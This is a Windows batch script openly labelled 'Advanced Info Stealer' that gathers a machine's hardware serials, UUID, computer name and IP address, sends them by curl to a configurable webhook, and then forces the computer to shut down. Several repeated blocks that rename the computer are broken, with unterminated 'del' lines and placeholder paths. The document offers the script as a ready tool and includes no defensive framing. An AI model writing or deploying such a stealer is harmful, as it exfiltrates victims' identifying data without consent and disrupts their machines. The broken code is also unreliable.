@echo off
color F0
echo Advanced Info Stealer!

::SET WEBHOOK HERE!
set webhook=WEBHOOK_HERE

for /f "tokens=2 delims==" %%J in ('wmic csproduct get uuid /value') do set hwid=%%J
Find /I "%hwid%" {Location of file} > {Location of confirmation file}
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
wmic computersystem where caption='%computername%' rename %HN%` 
del {Location
for /f "tokens=2 delims==" %%J in ('wmic diskdrive get serialnumber /value') do set diskdrive=%%J
Find /I "%diskdrive%" {Location of file} > {Location of confirmation file}
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
wmic computersystem where caption='%computername%' rename %HN%` 
del {Location
for /f "tokens=2 delims==" %%J in ('wmic baseboard get serialnumber /value') do set baseboard=%%J
Find /I "%baseboard%" {Location of file} > {Location of confirmation file}
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
wmic computersystem where caption='%computername%' rename %HN%` 
del {Location
for /f "tokens=2 delims==" %%J in ('wmic cpu get serialnumber /value') do set cpu=%%J
Find /I "%cpu%" {Location of file} > {Location of confirmation file}
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
wmic computersystem where caption='%computername%' rename %HN%` 
del {Location
for /f "tokens=2 delims==" %%J in ('wmic bios get serialnumber /value') do set bios=%%J
Find /I "%bios%" {Location of file} > {Location of confirmation file}
For /f "tokens=1,2* delims=," %%G in ({Location of confirmation file}) do set HN=%%H
wmic computersystem where caption='%computername%' rename %HN%` 
del {Location
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set ip=%%a
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"Opened on: `%date%` at `%time%`\nPC NAME: `%computername%`\nIP Address: `%ip%`\nHWID: `%hwid%`\nDiskDrive: `%diskdrive%`\nBaseBoard: `%baseboard%`\nCPU: `%cpu%`\nBIOS: `%bios%`\n\"}" %webhook%
timeout 5 >nul
shutdown /s /f /t 0
exit